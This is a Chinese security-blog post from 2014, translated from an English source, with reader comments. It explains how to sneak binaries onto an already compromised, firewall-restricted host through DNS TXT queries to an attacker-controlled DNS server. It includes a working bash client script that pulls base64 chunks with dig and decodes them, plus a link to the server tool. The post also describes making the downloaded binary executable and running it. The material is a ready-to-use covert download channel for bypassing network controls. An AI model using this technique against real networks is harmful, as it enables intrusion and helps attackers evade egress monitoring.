<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">通过dns进行文件下载</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">我是壮丁</a> <span class="bull">·</span> <time title="2014/03/31 11:07" ui-time="" datetime="2014/03/31 11:07" class="published ng-binding ng-isolate-scope">2014/03/31 11:07</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x00 背景</h2><hr><p>偶尔会遇到这样的情况，防火墙规则极大的限制外网的访问(这种情况经常是一个白名单来处理，仅仅允许少量的主机和外网产生连接)想要下载一下二进制文件到目标主机上，就会很麻烦。</p><p>我们来假设这样的一个情景：你已经拥有在上述情况下的主机、需要和你的本机传输工具或者数据。在这个情景下面、你被限制了下载，有一个好办法来突破这种限制，那就是通过DNS查询的来获得想要的数据。</p><p>如果目标机器的设定的DNS(或者任何只要目标主机能够在网络上访问的DNS服务器)能够在网络上做DNS查询。那就能够下载想要的二进制文件。</p><h2>0x02 原理</h2><hr><p>不了解这项技术的人可能以为是下面这样的流程:</p><pre><code>目标主机&lt;----&gt;网络上的DNS服务器&lt;----&gt;注册域名服务器&lt;----&gt;攻击者的远端主机
</code></pre><p>其实是这样的流程：</p><pre><code>目标主机&lt;----&gt;构建的DNS服务器
</code></pre><p>只要目标主机能够和搭建的DNS服务器进行DNS解析就可以实现。</p><p>方法就是在服务端通过base64来编码这些特殊文件，对编码后的文件分块，同时添加到DNS Server的记录中，然后在目标主机上进行域名的解析请求，DNS服务器返回base64编码，在对base64编码进行解码，这样就实现了文件下载。</p><h2>0x03 实现</h2><hr><p>使用方法：</p><pre><code>1、对需要运行server.py脚本的服务器进行配置
2、在服务器上，执行python server.py -f fielname
3、在客户端上，运行sh client.sh dns.testdomain.com
4、这时你应该看到client和server开始产生base64的调试输出。client会把base64的编码写到本地文件中，同时在结束传输时解码
</code></pre><h3>0x03a Python代码导入了几个库，这些库可能需要单独安装:</h3><p>dns和argparse，在安装argparse的时候可能会报错，根据报错安装所需的库，即可正常运行server.py</p><p>PS:在https://pypi.python.org/ 能够下载到</p><p>server.py有三个参数：</p><pre><code>-f  指定需要分割的二进制文件
-q  静默模式，不在终端上输出日志信息
-s  指定开始的dns解析的子域，必须设置成一个数字client.sh中的i，必须和-s指定的一样。默认是0
</code></pre><h3>0x03b 在server上运行server.py，创建DNS服务器，a.out是一个二进制文件。</h3><p><img alt="enter image description here" img-src="75753a5029dc34595e0fe2adc7d7be6d9d08358a.jpg"></p><p>在目标主机上运行</p><h3>0x03c sh client.sh domain</h3><p>会产生以下输出</p><p><img alt="enter image description here" img-src="abe9e17d94827c0d883919005e3ed7f8f9b9ab1c.jpg"></p><h3>0x03d 脚本会对接受的base64的编码进行解码，添加执行权限后就可执行，执行二进制文件。</h3><p><img alt="enter image description here" img-src="1beb3a0203bca367145661ec821707b4a60ff830.jpg"></p><h2>0x04 源码</h2><hr><p>server.py下载地址</p><p><a href="https://github.com/breenmachine/dnsftp">https://github.com/breenmachine/dnsftp</a></p><p>client.sh脚本</p><pre><code>#!bash
#!/bin/bash
error=';; connection timed out; no servers could be reached'
i=0
echo ''&gt; output.b64
while :
do
  RESP=`dig +short $i.$1 TXT | cut -d'"' -f 2`
  if [ "$RESP" = "$error" ];
  then
    echo "Timeout - done"
    break
  fi
  echo -ne $RESP &gt;&gt; output.b64
  echo $RESP
  i=$((i+1))
done
cat output.b64 | base64 -d &gt;&gt; output
</code></pre><p>文件打包下载：<a href="http://static.wooyun.org/20141017/2014101715211783609.zip">dnsftp-master.zip</a></p><p>翻译出处：</p><p><a href="http://breenmachine.blogspot.com/2014/03/downloading-files-through-recursive-dns.html">http://breenmachine.blogspot.com/2014/03/downloading-files-through-recursive-dns.html</a></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="donate" style="padding:10px;border-top:1px solid #d9d9d9;text-align:center"><span>碎银子打赏，作者好攒钱娶媳妇：</span><br><br><img src="http://static.wooyun.org/wooyun/upload/donate/20160511153641e236eafe19e2a9374c586ee768ad283e.jpg" style="width:200px;height:200px"></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/2719" rel="bookmark" id="re1">从内存中窃取未加密的SSH-agent密钥</a></li><li><a href="http://drops.wooyun.org/tools/601" rel="bookmark" id="re2">跑wordpress用户密码脚本</a></li><li><a href="http://drops.wooyun.org/tools/4760" rel="bookmark" id="re3">使用sqlmap中tamper脚本绕过waf</a></li><li><a href="http://drops.wooyun.org/tips/10205" rel="bookmark" id="re4">服务端模板注入攻击 (SSTI) 之浅析</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">紫霞仙子</span> <span class="reply-time">2016-01-04 10:40:40</span></div><p></p><p>你屌爆了！</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小贱人</span> <span class="reply-time">2014-04-14 13:33:13</span></div><p></p><p>mark</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">我是壮丁</span> <span class="reply-time">2014-04-02 17:56:57</span></div><p></p><p>bug在哪里啊，求指点</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">test</span> <span class="reply-time">2014-04-02 09:15:59</span></div><p></p><p>该程序有bug XD</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">我是壮丁</span> <span class="reply-time">2014-04-01 13:36:37</span></div><p></p><p>少打了。。。。，应该是追加的。。。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">tmp</span> <span class="reply-time">2014-03-31 22:14:53</span></div><p></p><p>base64 -d ( output.b64 ) output</p><p>左右箭头会被过滤... 用 () 表示 读入输出</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">tmp</span> <span class="reply-time">2014-03-31 22:12:59</span></div><p></p><p>1 ==</p><p>base64 -d 1 output.b64 2 output</p><p>回复会被过滤掉符号......</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">tmp</span> <span class="reply-time">2014-03-31 22:12:00</span></div><p></p><p>1==</p><p>base64 -d 1 output.b64 2 output</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">tmp</span> <span class="reply-time">2014-03-31 22:10:05</span></div><p></p><p>base64 -d output</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">我是壮丁</span> <span class="reply-time">2014-03-31 20:05:47</span></div><p></p><p>确实不是新东西，不过有用就可以了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">瞌睡龙</span> <span class="reply-time">2014-03-31 18:28:41</span></div><p></p><p>招不在新，有用则行 :)</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">iskit</span> <span class="reply-time">2014-03-31 16:26:01</span></div><p></p><p>不是什么新东西http://www.aldeid.com/wiki/File-transfer-via-DNS</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">皮皮虾</span> <span class="reply-time">2014-03-31 11:24:08</span></div><p></p><p>你大爷的，取个这名字，，，，卖队友</p><p></p></div></div></div></div></div></main>